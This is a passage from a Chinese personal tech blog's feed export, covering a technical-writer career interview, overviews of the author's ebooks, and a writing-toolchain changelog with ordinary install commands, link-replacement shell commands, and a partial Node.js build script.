<h4 id="是否需要工程学位-背景才能成为技术作家？"><a href="#是否需要工程学位-背景才能成为技术作家？" class="headerlink" title="是否需要工程学位/背景才能成为技术作家？"></a>是否需要工程学位/背景才能成为技术作家？</h4><p>许多人认为需要工程学位/背景才能成为技术作家，这实际上是另一个很大的误解。</p>
<p>我再大学里课程包括计算机科学，音乐和艺术。虽然计算机科学课程有助于理解技术概念，但我的教育中最有用的方面实际上是学习如何学习和倾听。在学校学习的一些技术工具和概念有助于我作为技术作家的角色，但最重要的是，他们引导我快速学习并提出问题，这对于科技写作工作至关重要。</p>
<p>技术作家来自不同的背景，你决不需要工程学位或背景来开始这个领域（尽管它肯定没有害处！）。如果有很强的写作技巧和学习的愿望，技术写作可能非常适合你。</p>
<h4 id="为什么喜欢在-Uber-担任技术作家？"><a href="#为什么喜欢在-Uber-担任技术作家？" class="headerlink" title="为什么喜欢在 Uber 担任技术作家？"></a>为什么喜欢在 Uber 担任技术作家？</h4><p>无论您处于职业生涯的哪个阶段，或者拥有什么职位，都必须考虑所在公司是否与您的目标和价值观一致。</p>
<p>在 Uber 工作最好的部分是人。无论是作为实习生还是全职员工，当第一次加入团队时，我的团队成员都竭尽全力欢迎并指导我 — 对我的团队来说对其他人也是如此。我在 Uber 遇到的每个人都对他们的工作充满热情，热情和热情。办公室的能量具有传染性，强烈的社区意识和自豪感使我每天都期待上班。</p>
<p>我很喜欢 Uber 是一个可以通过向上和横向流动来建立自己职业生涯的地方。我的一位同事刚刚从技术作家角色转变为软件工程师角色，另一位同事转变为项目经理角色，都在 Uber 内部完成转变。我欣赏 Uber 对于岗位流动性的支持态度。</p>
<p>特别是从技术写作的角度来看，我认为优步是一家伟大的公司。我得到了各级管理层的支持，他们真正看到了技术写作的价值。感谢这种支持，我知道我的工作很重要。当我的工作项目遇到挑战时，这有助于让我保持积极性。</p>
<p>最后，成为 Uber 家族的一员让我很兴奋，因为我们所做的工作不仅影响了现在，也影响了未来。我很高兴能成为一家正在改变交通运输业的公司一员。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Uber-Writer-Female.png" alt=""></p>
<h4 id="与其他组织相比，Uber-的技术写作有何不同？"><a href="#与其他组织相比，Uber-的技术写作有何不同？" class="headerlink" title="与其他组织相比，Uber 的技术写作有何不同？"></a>与其他组织相比，Uber 的技术写作有何不同？</h4><p>因为我的行业经验有限，所以我征求了 Uber 技术作家的帮助，以此来讨论这个话题。</p>
<p>高级技术作家亚当·帕夫拉卡（Adam Pavlacka）：Uber 非常重视引导工程师撰写并真正鼓励良好文档的工作文化。虽然许多公司只聘请作家提供文档或从工程师的笔记中抄写原始副本，但 Uber 聘请的技术作家会以更加亲力亲为的方式学习他们正在撰写的主题。</p>
<h4 id="给有志于成为技术作家的最大建议是什么？"><a href="#给有志于成为技术作家的最大建议是什么？" class="headerlink" title="给有志于成为技术作家的最大建议是什么？"></a>给有志于成为技术作家的最大建议是什么？</h4><p>如果您想成为技术作家，请立即开始写作！您不需要正式工作来练习技术写作技巧。查找有关您使用的产品或应用的现有文档，并了解如何改进它。与需要文档帮助的开源项目一起工作。查看有关激动人心技术概念的在线教程。这些小步骤将有助于建立您的投资组合并发展您的技能。</p>
<p>如果你认为自己不够“技术人员”或者不适合技术作家的模式，也不要放弃成为技术作家的想法。条条大路通罗马！如果您有志于成为技术作家，请遵循您内心的愿望走向成功。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2016/06/11/Writing/">最佳写作实践：从Evernote到Ulysses</a></li>
<li><a href="https://riboseyim.com/2018/12/02/Writing-Technical/">技术团队中的作家</a></li>
<li><a href="https://riboseyim.com/2017/06/03/Writing-WriterToolChain/">我的写作工具链</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践精要</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.infoq.com/cn/news/2017/10/blogging-empowers-agile-teams?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">写博客如何助力敏捷团队(How Blogging Empowers Agile Teams)| Matt Jukes - mySociety产品经理 Agile Cambridge 2017 </a></li>
<li><a href="https://medium.freecodecamp.org/how-to-write-a-good-software-design-document-66fcf019569c">How to write a good software design doc</a></li>
<li><a href="http://lionheartwang.github.io/blog/2017/11/26/shi-yong-landslideji-yu-markdownzhi-zuo-zai-xian-slide/">使用Landslide基于MarkDown制作在线Slide</a></li>
<li><a href="https://gitbook.cn/books/5af39708fadc1504a6dd9269/index.html">技术作家成长之路：技术博客到技术作家</a></li>
<li><a href="http://expert.51cto.com/art/200710/58202_all.htm">专访Java作家孙卫琴：感受女性技术专家的成长经历 | 2007-10-17 </a></li>
</ul>
]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>eBook</tag>
        <tag>Engineering</tag>
        <tag>工具癖</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title>电子书：《数据可视化》</title>
    <url>/2018/03/02/eBook-DVM/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li><a href="https://riboseyim.com/2017/12/21/eBook-LPM/">《The Linux Perf Master》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></li>
</ul>
<blockquote>
<p>If you cannot explain something in simple terms, you don’t understand it. The best way to learn is to teach. —— Richard Feynman</p>
</blockquote>
<span id="more"></span>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="https://legacy.gitbook.com/book/riboseyim/ebook-data-visualization-master">https://legacy.gitbook.com/book/riboseyim/ebook-data-visualization-master</a></p>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>国内用户访问GitBook不太稳定，提供百度云快捷下载，同时提供了pdf、mobi、ePub三种格式。</p>
<h2 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h2><p><strong>基本原则：持续发布，争取做到每四个月发布一个新版本</strong></p>
<h4 id="Edition-0-1"><a href="#Edition-0-1" class="headerlink" title="Edition 0.1"></a>Edition 0.1</h4>]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>eBook</tag>
        <tag>Engineering</tag>
        <tag>数据可视化</tag>
        <tag>Developer</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title>电子书：《Machine Learning Master》</title>
    <url>/2018/03/02/eBook-MLM/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.com/2017/12/21/eBook-LPM/">《The Linux Perf Master》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></li>
</ul>
<blockquote>
<p>If you cannot explain something in simple terms, you don’t understand it. The best way to learn is to teach. —— Richard Feynman</p>
</blockquote>
<span id="more"></span>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li>Chapter 1: 机器学习导论</li>
<li>神经网络基础</li>
<li>机器学习项目 Top 30</li>
<li>Chapter 2: 机器学习算法</li>
<li>机器学习算法 Top 10</li>
<li>如何选择机器学习算法</li>
<li>Chapter 3: 机器学习应用开发</li>
<li>Machine Learning(一):基于 TensorFlow 实现宠物血统智能识</li>
<li>Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</li>
<li>Chapter N: 人工智能与社会</li>
<li>经济学家谈人工智能</li>
<li>经济学人：计算机如何学习人类语言？</li>
<li>经济学人：译者为何忧虑？</li>
</ul>
<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>国内用户访问GitBook不太稳定，提供百度云快捷下载，同时提供了pdf、mobi、ePub三种格式。</p>
<h2 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h2><p><strong>基本原则：持续发布，争取做到每四个月发布一个新版本</strong></p>
<h4 id="Edition-0-1-20180508"><a href="#Edition-0-1-20180508" class="headerlink" title="Edition 0.1 20180508"></a>Edition 0.1 20180508</h4><ul>
<li>调整章节结构</li>
<li>add 神经网络基础</li>
<li>add 如何选择机器学习算法</li>
<li>add 经济学家谈人工智能</li>
</ul>
<h4 id="Edition-0-1-201803"><a href="#Edition-0-1-201803" class="headerlink" title="Edition 0.1 201803"></a>Edition 0.1 201803</h4><ul>
<li>Chapter 1: 机器学习导论</li>
<li>Machine Learning(一):基于 TensorFlow 实现宠物血统智能识</li>
<li>Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</li>
<li>机器学习算法 Top 10</li>
<li>机器学习项目 Top 30</li>
<li>Chapter N: 媒体报道集</li>
<li>经济学人：计算机如何学习人类语言？</li>
<li>经济学人：译者为何忧虑？</li>
</ul>
]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>eBook</tag>
        <tag>Engineering</tag>
        <tag>Developer</tag>
        <tag>数学与算法</tag>
        <tag>Machine-Learning</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title>电子书 | Overview of RiboseYim&#39;s eBook</title>
    <url>/2017/02/09/eBook/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li><a href="https://riboseyim.com/2017/12/21/eBook-LPM/">《The Linux Perf Master》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></li>
</ul>
<blockquote>
<p>If you cannot explain something in simple terms, you don’t understand it. The best way to learn is to teach. —— Richard Feynman<br>‏</p>
</blockquote>
<span id="more"></span>
<h2 id="故事"><a href="#故事" class="headerlink" title="故事"></a>故事</h2><p>佛罗里达州立大学的心理学教授，安德斯·埃里克森（Anders Ericsson）</p>
<p>幼稚练习（naïve practice）： 从你自觉“基本可以了”的那一刻，进步就停滞了。<br>刻意练习（deliberate practice）：预，是有明确预期（purposeful practice），怎样的练习成果是好，怎样是差，并且知道需要衡量哪些指标来给自己反馈。思，是要用脑思考，不是一味沿用老办法，而是用各种新方式不断尝试，如此，才能不断往上突破，真正能提升能力。</p>
<p>一项英国研究显示，伦敦的士司机与公交司机同样开车多年，但只有的士司机负责记忆空间位置的大脑海马区变大。盖因公交司机每日开同一条路线，固然驾轻就熟，大脑却未得足够挑战。而的士司机需要时时掌握伦敦最新路况，思考如何最快最顺地将乘客送达，大脑遂得充分发展。</p>
<p>一个学会拉《梁祝》的人，重复练五年后可能拉得不费吹灰之力，对曲子的控制力与表现力却不曾精进半分——没准还不如刚学会时。顶级医院里，老医生是一流人才，因其持续面对疑难杂症，必须不断突破自我。在无甚挑战的小医院，年资高的医生有时反而知识陈旧落后，还不如毕业没多久的年青医生。才能如逆水行舟，不进则退。顺风顺水地练了一万小时？你可能只是在幼稚练习。</p>
<h4 id="Everyone-can-publish-an-e-book"><a href="#Everyone-can-publish-an-e-book" class="headerlink" title="Everyone can publish an e-book"></a>Everyone can publish an e-book</h4><p>2016年7月份我已经提到，希望能实现一个小目标：出版一本专业书籍。目标虽小，实现不易。参阅了众多老司机的成功经验，我决定还是先整理一本电子书出来。《Linux Perf Master》Edition 0.1 在 2017 年初首次发布于GitBook，主题以Linux性能为核心，覆盖评估诊断、监控、优化的工具和方法论，还补充了几个参考案例，内容来源于过去一段时间翻译、发表过的文章，部分章节稍微调整了排版。</p>
<h2 id="写作工具链"><a href="#写作工具链" class="headerlink" title="写作工具链"></a>写作工具链</h2><p>早期没有使用 Markdown 发表的文章，没办法做到一键复用，必须再次进行繁琐的排版。另外，个人也不推荐使用编辑器：GitBook Editor for Mac ，它使用起来不太友好，也很容易崩溃。也不推荐在本地搭建一套自己的GitBook服务端，对个人用户来说过于繁琐。我的方式是“本地编写+自动同步”的方式：Git + Markdown真是珠联璧合、威力无穷。更多细节请查看：<a href="https://riboseyim.com/2017/06/03/Writing-WriterToolChain/">我的写作工具链（持续更新）</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Writer_Tools_Chain_5.png" alt=""></p>
<h2 id="我的电子书"><a href="#我的电子书" class="headerlink" title="我的电子书"></a>我的电子书</h2><h4 id="《The-Linux-Perf-Master》"><a href="#《The-Linux-Perf-Master》" class="headerlink" title="《The Linux Perf Master》"></a><a href="https://riboseyim.com/2017/12/21/eBook-LPM/">《The Linux Perf Master》</a></h4><p><strong>Topics</strong>: Linux，性能追踪 <a href="https://riboseyim.com/2017/12/21/eBook-LPM/">&gt;&gt;&gt;&gt;&gt;&gt;了解更多&gt;&gt;&gt;&gt;&gt;&gt;</a></p>
<ul>
<li><a href="https://riboseyim.gitbook.io/perf">riboseyim.gitbook.io</a></li>
<li>【百度云盘 pdf、mobi、ePub】 <a href="https://pan.baidu.com/s/1C20TAKtYxXeRkTjNy43WOQ">Edition 0.4 20180714</a></li>
<li><a href="https://www.gitbook.com/book/riboseyim/linux-perf-master">legacy.gitbook.com</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-LPM-201803.png" alt=""></p>
<h4 id="《The-Cyber-Security-Master》"><a href="#《The-Cyber-Security-Master》" class="headerlink" title="《The Cyber-Security Master》"></a><a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">《The Cyber-Security Master》</a></h4><p><strong>Topics</strong>:网络安全 <a href="https://www.gitbook.com/book/riboseyim/cyber-security-manual">&gt;&gt;&gt;&gt;&gt;&gt;了解更多&gt;&gt;&gt;&gt;&gt;&gt;</a></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/banner-CSM-201803.png" alt=""></p>
<h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<p><strong>Topics</strong>:机器学习 <a href="https://www.gitbook.com/book/riboseyim/machine-learning">&gt;&gt;&gt;&gt;&gt;&gt;了解更多&gt;&gt;&gt;&gt;&gt;&gt;</a></p>
<h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>版权声明：自由转载-非商用-非衍生-保持署名| <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/legalcode">Creative Commons BY-NC-ND 4.0</a></p>
<p><strong>You are free to Share</strong></p>
<p>copy and redistribute the material in any medium or format<br>The licensor cannot revoke these freedoms as long as you follow the license terms.</p>
<p><strong>Under the following terms:</strong></p>
<ol>
<li>Attribution — You must give appropriate credit, provide a link to the license, and indicate if changes were made.You may do so in any reasonable manner, but not in any way that suggests the licensor endorses you or your use.</li>
<li>NonCommercial — You may not use the material for commercial purposes.</li>
<li>NoDerivatives — If you remix, transform, or build upon the material, you may not distribute the modified material.</li>
<li>No additional restrictions — You may not apply legal terms or technological measures that legally restrict others from doing anything the license permits.</li>
</ol>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://medium.com/@rothgar/the-economics-of-writing-a-technical-book-689d0c12fe39">The Economics of Writing a Technical Book</a></li>
<li><a href="http://es6.ruanyifeng.com/">ECMAScript 6 入门</a></li>
<li><a href="http://songshuhui.net/archives/95669">怎样练习，才能成为一流专家？| 科学松鼠会@游识猷 </a></li>
</ul>
]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>eBook</tag>
        <tag>Engineering</tag>
        <tag>Economist</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Developer</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title>我的写作工具链</title>
    <url>/2017/06/03/Writing-WriterToolChain/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>工欲善其事，必先利其器</p>
</blockquote>
<span id="more"></span>
<h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><ul>
<li><strong>OmniFouse</strong>: 项目和上下文分类设置还比较混乱，有待重构</li>
<li><strong>Ulysses</strong>：多种样式效果不佳（图片连接、代码块）</li>
<li><strong>编辑发布流程</strong>:目前的方式（local-&gt;Blog(markdown),review-&gt;微信公众号），内容粘贴到公众号编辑器还需要比较多手工处理，未统一微信发布内容样式表。</li>
<li><strong>Mac</strong>:如何设置左手 &lt;- -&gt; 方向键 ？ （右手仍然需要鼠标的情况下）</li>
<li><strong>PPT</strong>:vm win下正常，mac下英文字母乱码</li>
<li><a href="https://mp.weixin.qq.com/s/6S2HCDSx9ePwycHcve1Hlw">Texture：一个优雅的开源学术论文书写工具</a></li>
<li><a href="https://mp.weixin.qq.com/s/hwUKCkpvIjIDeEVKh5xF7g">Classic Papers:谷歌学术推出“经典论文”排行</a></li>
<li>失效链接（图片、外部链接）自动检测</li>
</ul>
<h2 id="History"><a href="#History" class="headerlink" title="History"></a>History</h2><h3 id="v6-（-Current-）"><a href="#v6-（-Current-）" class="headerlink" title="v6 （ Current ）"></a>v6 （ Current ）</h3><h4 id="项目管理工具"><a href="#项目管理工具" class="headerlink" title="项目管理工具"></a>项目管理工具</h4><ul>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
</ul>
<h4 id="文献管理工具"><a href="#文献管理工具" class="headerlink" title="文献管理工具"></a>文献管理工具</h4><ul>
<li>文献管理软件 <a href="https://www.papersapp.com">Papers</a></li>
</ul>
<h4 id="网站管理工具"><a href="#网站管理工具" class="headerlink" title="网站管理工具"></a>网站管理工具</h4><ul>
<li><p>在线截屏工具 <a href="https://screendump.techulus.com/">screendump</a></p>
<p>用户只要输入网址，就会显示各种设备的网页截屏。</p>
</li>
</ul>
<h4 id="写作编辑工具"><a href="#写作编辑工具" class="headerlink" title="写作编辑工具"></a>写作编辑工具</h4><ul>
<li><p><strong>LaTex 语法</strong>:全面增强数学公式支持</p>
</li>
<li><p>add Atom plugin : markdown-preview-enhanced [预览、提纲、公式增强]</p>
</li>
<li>add hexo kramed replace hexo marked,enable mathjax</li>
<li>Latex Style 单行公式： $s=a+b$</li>
<li>Latex Style 多行公式：</li>
</ul>
<script type="math/tex; mode=display">\frac{\partial u}{\partial t}
= h^2 \left( \frac{\partial^2 u}{\partial x^2} +
\frac{\partial^2 u}{\partial y^2} +
\frac{\partial^2 u}{\partial z^2}\right)</script><ul>
<li><p>KaTeX Style (markdown-preview-enhanced)：<br>[<br>E=mc^2<br>]</p>
</li>
<li><p>disable hexo gitment comment plugin</p>
</li>
<li>add 留言箱 <a href="https://github.com/riboseyim/riboseyim.com.comment">https://github.com/riboseyim/riboseyim.com.comment</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Atom-Markdown-en.png" alt=""></p>
<ul>
<li>Styled Terminal Markdown Viewer</li>
</ul>
<p>mdv 在终端下渲染出 Markdown 文档的样式，包含多个主题、支持表格、源代码高亮显示、文件更改监视等功能。</p>
<ul>
<li><a href="https://github.com/axiros/terminal_markdown_viewer">project mdv github link</a></li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ pip install mdv</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Tools-Preview-mdv.png" alt=""></p>
<h3 id="v5-20181124"><a href="#v5-20181124" class="headerlink" title="v5:20181124"></a>v5:20181124</h3><p><img src="http://riboseyim-qiniu.riboseyim.com/Writer_Tools_Chain_5.png" alt=""></p>
<h4 id="域名管理工具"><a href="#域名管理工具" class="headerlink" title="域名管理工具"></a>域名管理工具</h4><ul>
<li>add 独立域名 <a href="https://riboseyim.com">https://riboseyim.com</a> [Ribose Yim’s Tech Blog] 【腾讯云】</li>
<li>故障修复：图床域名更换 xxx.clouddn.com to <a href="http://riboseyim-qiniu.riboseyim.com">http://riboseyim-qiniu.riboseyim.com</a> 【七牛云】</li>
</ul>
<h4 id="add-hexo-theme-Cafe"><a href="#add-hexo-theme-Cafe" class="headerlink" title="add hexo theme Cafe"></a>add hexo theme <a href="https://github.com/giscafer/hexo-theme-cafe">Cafe</a></h4><ul>
<li>fix hexo search feature -&gt; google search</li>
<li>add gitment comment</li>
<li>auto syn workflow: from riboseyim.github.io to project riboseyim.com</li>
<li>add Xmind replace MindManager,201807</li>
<li>add slides maker:landslide | 试用 <a href="https://github.com/msoedov/hacker-slides">hacker slides</a></li>
</ul>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 主题</span></span><br><span class="line">$ git clone https:<span class="regexp">//gi</span>thub.com/giscafer/hexo-theme-cafe.git themes/cafe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 素材链接替换</span></span><br><span class="line">$ <span class="keyword">grep</span> <span class="string">&#x27;clouddn.com&#x27;</span> ./*.md | awk -F <span class="string">&#x27;(&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | awk -F <span class="string">&#x27;.com&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; oldomain.log</span><br><span class="line">$ <span class="keyword">sort</span> -n oldomain.log  | uniq &gt; oldomin.list</span><br><span class="line">http:<span class="regexp">//</span>o8m8ngokc.bkt.clouddn.com</span><br><span class="line">http:<span class="regexp">//</span>og2061b3n.bkt.clouddn.com</span><br><span class="line">http:<span class="regexp">//</span>ogtqvs10n.bkt.clouddn.com</span><br><span class="line">http:<span class="regexp">//</span>okkuj60pj.bkt.clouddn.com</span><br><span class="line">http:<span class="regexp">//</span>omaxozji3.bkt.clouddn.com</span><br><span class="line">http:<span class="regexp">//</span>omb2onfvy.bkt.clouddn.com</span><br><span class="line">http:<span class="regexp">//</span>ombx24fbq.bkt.clouddn.com</span><br><span class="line">http:<span class="regexp">//</span>osgiyhxhy.bkt.clouddn.com</span><br><span class="line">http:<span class="regexp">//</span>ot6idm48o.bkt.clouddn.com</span><br><span class="line">http:<span class="regexp">//p</span>11slcnom.bkt.clouddn.com</span><br><span class="line"></span><br><span class="line">$ gsed -e <span class="string">&quot;s/old/new/g&quot;</span> sourcefile  &gt;  targetfile</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ landslide Machine-Learning-Algorithms.md -i -o &gt; test.html &amp;&amp; open test.html</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## pip 安装</span></span><br><span class="line">$ sudo pip install landslide</span><br><span class="line">The directory <span class="string">&#x27;/Users/yanrui/Library/Caches/pip/http&#x27;</span> <span class="keyword">or</span> its parent directory <span class="keyword">is</span> <span class="keyword">not</span> owned by the current user <span class="keyword">and</span> the cache has been disabled. Please check the permissions <span class="keyword">and</span> owner of that directory. If executing pip <span class="keyword">with</span> sudo, you may want sudo<span class="string">&#x27;s -H flag.</span></span><br><span class="line"><span class="string">The directory &#x27;</span>/Users/yanrui/Library/Caches/pip<span class="string">&#x27; or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo&#x27;</span>s -H flag.</span><br><span class="line">Collecting landslide</span><br><span class="line">Requirement already satisfied: Markdown <span class="keyword">in</span> /usr/local/lib/python2<span class="number">.7</span>/site-packages (<span class="keyword">from</span> landslide) (<span class="number">2.6</span><span class="number">.11</span>)</span><br><span class="line">Requirement already satisfied: Jinja2 <span class="keyword">in</span> /usr/local/lib/python2<span class="number">.7</span>/site-packages (<span class="keyword">from</span> landslide) (<span class="number">2.10</span>)</span><br><span class="line">Requirement already satisfied: docutils <span class="keyword">in</span> /usr/local/lib/python2<span class="number">.7</span>/site-packages (<span class="keyword">from</span> landslide) (<span class="number">0.14</span>)</span><br><span class="line">Requirement already satisfied: Pygments <span class="keyword">in</span> /usr/local/lib/python2<span class="number">.7</span>/site-packages (<span class="keyword">from</span> landslide) (<span class="number">2.2</span><span class="number">.0</span>)</span><br><span class="line">Requirement already satisfied: six <span class="keyword">in</span> /usr/local/lib/python2<span class="number">.7</span>/site-packages (<span class="keyword">from</span> landslide) (<span class="number">1.11</span><span class="number">.0</span>)</span><br><span class="line">Requirement already satisfied: MarkupSafe&gt;=<span class="number">0.23</span> <span class="keyword">in</span> /usr/local/lib/python2<span class="number">.7</span>/site-packages (<span class="keyword">from</span> Jinja2-&gt;landslide) (<span class="number">1.0</span>)</span><br><span class="line">Installing collected packages: landslide</span><br><span class="line">Successfully installed landslide-<span class="number">1.1</span><span class="number">.3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 源码安装</span></span><br><span class="line">$ git clone https://github.com/adamzap/landslide.git</span><br><span class="line">$ cd landslide</span><br><span class="line">$ python setup.py build</span><br><span class="line">$ sudo python setup.py install</span><br></pre></td></tr></table></figure>
<h3 id="v4-201801"><a href="#v4-201801" class="headerlink" title="v4:201801"></a>v4:201801</h3><p><img src="http://riboseyim-qiniu.riboseyim.com/Writer_Tools_Chain_4.png" alt=""></p>
<h4 id="可视化图表"><a href="#可视化图表" class="headerlink" title="可视化图表"></a>可视化图表</h4><ul>
<li><a href="https://riboseyim.github.io/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
</ul>
<h4 id="程序化内容生成"><a href="#程序化内容生成" class="headerlink" title="程序化内容生成"></a>程序化内容生成</h4><ul>
<li><a href="https://riboseyim.github.io/2017/12/21/Language-Auto-Generator/">基于 Node.js 实现程序化文本编辑</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">基于 Graphviz 实现程序化绘图</a></li>
<li><strong>图片处理（Photoshop)</strong>:批处理与动作</li>
<li><strong>Blog generator(hexo)</strong>:优化内容页脚模版、修复google/baidu site xml 问题、修复https兼容问题</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /theme/yilia/layout/_partial/article.ejs</span><br></pre></td></tr></table></figure>
<h4 id="编辑管理工具"><a href="#编辑管理工具" class="headerlink" title="编辑管理工具"></a>编辑管理工具</h4><ul>
<li>扩展 Markdown 源文件编辑工具集（nodejs-based）</li>
</ul>
<p>前期需求：</p>
<p>1）源文件持续修改中出现的回归编辑工作，互相引用的链接较多<br>2）兼容现有的 Blog Generator (Hexo) 便于融合使用<br>3）支持 command-line 模式便于调用</p>
<p>后续目标：<br>1）专题模板一次编辑，多处插入<br>2）主体自动聚合，类似维基（Template talk）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs-extra&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// All paths are relative to package.json.</span></span><br><span class="line"><span class="keyword">var</span> pagesPath = <span class="string">&#x27;./source/_posts&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> copyFolders = [<span class="string">&#x27;./images&#x27;</span>, <span class="string">&#x27;./css&#x27;</span>, <span class="string">&#x27;./js&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> outputPath = <span class="string">&#x27;./tmp&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// First delete everything in the tmp directory.</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Cleaning previous tmp...&#x27;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> file <span class="keyword">of</span> fs.readdirSync(outputPath))&#123;</span><br><span class="line">    fs.removeSync(path.join(outputPath, file));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (err)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Error during cleanup: &#x27;</span>+err);</span><br><span class="line">  process.exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Then read everything in the pages directories.</span></span><br><span class="line"><span class="keyword">var</span> pages = &#123;&#125;, pagesMeta = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Loading pages...&#x27;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> page <span class="keyword">of</span> fs.readdirSync(pagesPath))&#123;</span><br><span class="line">    pages[page] = fs.readFileSync(path.join(pagesPath,page),<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (err)&#123;</span><br><span class="line">  <span 